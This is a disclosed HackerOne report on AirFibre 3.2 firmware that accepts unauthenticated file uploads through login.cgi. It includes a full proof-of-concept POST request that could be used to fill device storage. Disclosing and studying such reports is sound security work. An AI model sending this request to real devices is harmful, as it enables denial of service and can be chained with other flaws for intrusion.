---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '201529'
original_report_id: '201529'
title: Can upload files without authentication on AirFibre 3.2
weakness: Violation of Secure Design Principles
team_handle: ui
created_at: '2017-01-27T11:50:46.330Z'
disclosed_at: '2017-05-17T16:59:23.833Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- violation-of-secure-design-principles
---

# Can upload files without authentication on AirFibre 3.2

## Metadata

- HackerOne Report ID: 201529
- Weakness: Violation of Secure Design Principles
- Program: ui
- Disclosed At: 2017-05-17T16:59:23.833Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

A POST submission such as below will upload a file to the tmp/upload directory without requiring authentication.  I have been unable to redirect the upload to another directory so cannot utilize for RCE however an attacker is able to use this to fill the disk space on the device which could cause a DoS.  

This could be combined with another vulnerability such as an LFI.

POST http://1[ip]/login.cgi HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 5179
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Host: 1[ip]

------WebKitFormBoundaryRfhSBNfoYzLOvXnc
Content-Disposition: form-data; name="file"; filename="test6.txt"
Content-Type: text/plain

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

------WebKitFormBoundaryRfhSBNfoYzLOvXnc--

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
